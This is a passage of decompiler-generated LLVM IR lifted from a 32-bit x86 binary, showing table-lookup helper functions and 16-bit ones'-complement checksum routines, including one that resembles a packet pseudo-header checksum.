  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 10, 6, 7, 11, 12, 13, 14, 15, 17, 16, 60, 18, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 19, 20, 21, 22, 23, 24, 45, 46, 47, 48, 49, 52, 53, 54, 55, 57, 58, 59, 61, 63, 64, 65, 66, 68, 69, 70, 71, 73, 72, 50, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 89, 87, 56, 51, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 223, 224, 225, 226, 125, 126, 127, 128, 129, 139, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 211, 213, 212, 207, 208, 209, 210, 214, 215, 216, 217, 218, 219, 220, 221, 222, 241, 242, 243, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 274, 275, 244, 245, 246, 247, 248, 249, 258, 259, 250, 251, 252, 253, 254, 255, 256, 257, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 287, 288, 276, 277, 278, 279, 282, 283, 280, 281, 67, 62, 284, 285, 286, 296, 289, 290, 291, 292, 293, 294, 295, 297, 298, 299 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 25, 24, 19, 26, 27, 28, 29, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 97, 98, 99, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 173, 174, 175, 176, 177, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 88, 85, 86, 87, 83, 89, 90, 91, 92, 93, 94, 95, 96, 149, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 161, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 164, 165, 166, 167, 168, 170, 169, 23, 171, 172 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 18, 19, 7, 8, 9, 10, 11, 12, 15, 16, 17, 20, 21, 22, 13, 14, 23, 33, 24, 25, 26, 27, 28, 29, 35, 60, 61, 30, 31, 32, 34, 36, 37, 38, 39, 40, 41, 44, 45, 42, 43, 46, 47, 121, 48, 49, 50, 51, 52, 53, 55, 56, 54, 57, 58, 59, 109, 110, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 29, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 436, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 34, 35, 36, 37, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 69, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 499, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 495, 496, 497, 498, 500, 501, 502, 503, 504, 505, 510, 511, 506, 507, 508, 509, 512, 513, 514, 515, 516, 517, 518, 519, 520, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 235, 236, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 237, 238, 239, 240, 242, 243, 241, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 263, 264, 268, 269, 265, 266, 267, 261, 262, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 408, 409, 413, 410, 411, 412, 414, 415, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 456, 457, 458, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 431, 432, 429, 430, 433, 434, 435, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 484, 451, 452, 453, 454, 455, 485, 486, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 478, 479, 476, 477, 79, 77, 480, 481, 482, 483, 487, 488, 489, 490, 491, 492, 493, 494 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8054af4.5 to i32), { 1, 0 }
  uselistorder i32 134564518, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_8051d40(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804d4b0() local_unnamed_addr {
dec_label_pc_804d4b0:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804d4b7 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804d4d5, label %dec_label_pc_804d4c0

dec_label_pc_804d4c0:                             ; preds = %dec_label_pc_804d4b0, %dec_label_pc_804d4c0
  %v0_804d4ce = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4c0 ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4c3 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4c0 ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v0_804d4cb = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4c0 ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v1_804d4c0 = inttoptr i32 %v0_804d4cb to i16*
  %v2_804d4c0 = load i16, i16* %v1_804d4c0, align 2
  %v3_804d4c0 = zext i16 %v2_804d4c0 to i32
  %v1_804d4c3 = add i32 %v0_804d4c3, -2
  %v1_804d4cb = add i32 %v0_804d4cb, 2
  %v2_804d4ce = add i32 %v3_804d4c0, %v0_804d4ce
  %v5_804d4d0 = icmp eq i32 %v1_804d4c3, 0
  %v9_804d4d0 = icmp eq i32 %v0_804d4c3, 3
  %v2_804d4d3 = or i1 %v9_804d4d0, %v5_804d4d0
  br i1 %v2_804d4d3, label %dec_label_pc_804d4d5.loopexit, label %dec_label_pc_804d4c0

dec_label_pc_804d4d5.loopexit:                    ; preds = %dec_label_pc_804d4c0
  br label %dec_label_pc_804d4d5

dec_label_pc_804d4d5:                             ; preds = %dec_label_pc_804d4d5.loopexit, %dec_label_pc_804d4b0
  %v0_804d4db = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4d5.loopexit ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4d8 = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4d5.loopexit ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v0_804d4d5 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4d5.loopexit ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v8_804d4d5 = icmp eq i32 %v0_804d4d5, 1
  %v1_804d4d6 = icmp eq i1 %v8_804d4d5, false
  br i1 %v1_804d4d6, label %dec_label_pc_804d4dd, label %dec_label_pc_804d4d8

dec_label_pc_804d4d8:                             ; preds = %dec_label_pc_804d4d5
  %v1_804d4d8 = inttoptr i32 %v0_804d4d8 to i8*
  %v2_804d4d8 = load i8, i8* %v1_804d4d8, align 1
  %v3_804d4d8 = sext i8 %v2_804d4d8 to i32
  %v2_804d4db = add i32 %v3_804d4d8, %v0_804d4db
  br label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d5, %dec_label_pc_804d4d8
  %v0_804d4dd = phi i32 [ %v0_804d4db, %dec_label_pc_804d4d5 ], [ %v2_804d4db, %dec_label_pc_804d4d8 ]
  %v1_804d4df = urem i32 %v0_804d4dd, 65536
  %v2_804d4e2 = udiv i32 %v0_804d4dd, 65536
  %v2_804d4e6 = add nuw nsw i32 %v1_804d4df, %v2_804d4e2
  %v2_804d4ea = udiv i32 %v2_804d4e6, 65536
  %v2_804d4ed = add nuw nsw i32 %v2_804d4ea, %v2_804d4e6
  %v1_804d4ef = urem i32 %v2_804d4ed, 65536
  %v1_804d4f2 = xor i32 %v1_804d4ef, 65535
  ret i32 %v1_804d4f2

; uselistorder directives
  uselistorder i32 %v2_804d4e6, { 1, 0 }
  uselistorder i32 %v0_804d4db, { 1, 0 }
  uselistorder i32 %v1_804d4c3, { 0, 2, 1 }
  uselistorder i32 %v4_804d4b7, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d4c0, { 1, 0 }
}

define i32 @function_804d500() local_unnamed_addr {
dec_label_pc_804d500:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804d515 = ptrtoint i16* %tmp14 to i32
  %v1_804d51e = add i32 %tmp17, 12
  %v2_804d51e = inttoptr i32 %v1_804d51e to i32*
  %v3_804d51e = load i32, i32* %v2_804d51e, align 4
  %v1_804d521 = add i32 %tmp17, 16
  %v2_804d521 = inttoptr i32 %v1_804d521 to i32*
  %v3_804d521 = load i32, i32* %v2_804d521, align 4
  %v7_804d527 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804d527, label %dec_label_pc_804d530, label %dec_label_pc_804d545

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d530
  %v0_804d53e = phi i32 [ %v2_804d53e, %dec_label_pc_804d530 ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d533 = phi i32 [ %v1_804d533, %dec_label_pc_804d530 ], [ %tmp16, %dec_label_pc_804d500 ]
  %v0_804d53b = phi i32 [ %v1_804d53b, %dec_label_pc_804d530 ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v1_804d530 = inttoptr i32 %v0_804d53b to i16*
  %v2_804d530 = load i16, i16* %v1_804d530, align 2
  %v3_804d530 = zext i16 %v2_804d530 to i32
  %v1_804d533 = add i32 %v0_804d533, -2
  %v1_804d53b = add i32 %v0_804d53b, 2
  %v2_804d53e = add i32 %v3_804d530, %v0_804d53e
  %v1_804d540 = add i32 %v0_804d533, -3
  %v6_804d540 = sub i32 2, %v0_804d533
  %v7_804d540 = and i32 %v1_804d533, %v6_804d540
  %v8_804d540 = icmp slt i32 %v7_804d540, 0
  %v9_804d540 = icmp eq i32 %v1_804d540, 0
  %v10_804d540 = icmp slt i32 %v1_804d540, 0
  %v3_804d543 = icmp eq i1 %v10_804d540, %v8_804d540
  %v4_804d543 = icmp eq i1 %v9_804d540, false
  %v5_804d543 = and i1 %v4_804d543, %v3_804d543
  br i1 %v5_804d543, label %dec_label_pc_804d530, label %dec_label_pc_804d545.loopexit

dec_label_pc_804d545.loopexit:                    ; preds = %dec_label_pc_804d530
  br label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d545.loopexit, %dec_label_pc_804d500
  %v0_804d5b0 = phi i32 [ %v2_804d53e, %dec_label_pc_804d545.loopexit ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d5ae = phi i32 [ %v1_804d53b, %dec_label_pc_804d545.loopexit ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v0_804d545 = phi i32 [ %v1_804d533, %dec_label_pc_804d545.loopexit ], [ %tmp16, %dec_label_pc_804d500 ]
  %v8_804d545 = icmp eq i32 %v0_804d545, 1
  br i1 %v8_804d545, label %dec_label_pc_804d5ac, label %dec_label_pc_804d548

dec_label_pc_804d548:                             ; preds = %dec_label_pc_804d545, %dec_label_pc_804d5ac
  %v0_804d556 = phi i32 [ %v0_804d5b0, %dec_label_pc_804d545 ], [ %v2_804d5b0, %dec_label_pc_804d5ac ]
  %v2_804d54c = udiv i32 %v3_804d521, 65536
  %v1_804d54f = add i32 %tmp17, 9
  %v2_804d54f = inttoptr i32 %v1_804d54f to i8*
  %v3_804d54f = load i8, i8* %v2_804d54f, align 1
  %v1_804d552 = zext i8 %v3_804d54f to i16
  %v2_804d552 = call i16 @llvm.bswap.i16(i16 %v1_804d552)
  %v3_804d552 = zext i16 %v2_804d552 to i32
  %v2_804d556 = add i32 %v0_804d556, %v2_804d54c
  %v2_804d55e = add i32 %v2_804d556, %v3_804d552
  %v1_804d564 = urem i32 %v3_804d51e, 65536
  %v2_804d56a = udiv i32 %v3_804d51e, 65536
  %v1_804d571 = urem i32 %v3_804d521, 65536
  %v4_804d579 = zext i16 %tmp15 to i32
  %v2_804d56d = add nuw nsw i32 %v2_804d56a, %v4_804d579
  %v2_804d577 = add nuw nsw i32 %v2_804d56d, %v1_804d564
  %v2_804d584 = add nuw nsw i32 %v2_804d577, %v1_804d571
  %v2_804d586 = add i32 %v2_804d584, %v2_804d55e
  %tmp = icmp ult i32 %v2_804d586, 65536
  br i1 %tmp, label %dec_label_pc_804d59e, label %dec_label_pc_804d590

dec_label_pc_804d590:                             ; preds = %dec_label_pc_804d548, %dec_label_pc_804d590
  %v2_804d5953 = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994.in = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994 = udiv i32 %v2_804d5994.in, 65536
  %v1_804d590 = urem i32 %v2_804d5953, 65536
  %v2_804d595 = add nuw nsw i32 %v1_804d590, %v2_804d5994
  %tmp25 = icmp ult i32 %v2_804d595, 65536
  %v1_804d59c = icmp eq i1 %tmp25, false
  br i1 %v1_804d59c, label %dec_label_pc_804d590, label %dec_label_pc_804d59e.loopexit

dec_label_pc_804d59e.loopexit:                    ; preds = %dec_label_pc_804d590
  br label %dec_label_pc_804d59e

dec_label_pc_804d59e:                             ; preds = %dec_label_pc_804d59e.loopexit, %dec_label_pc_804d548
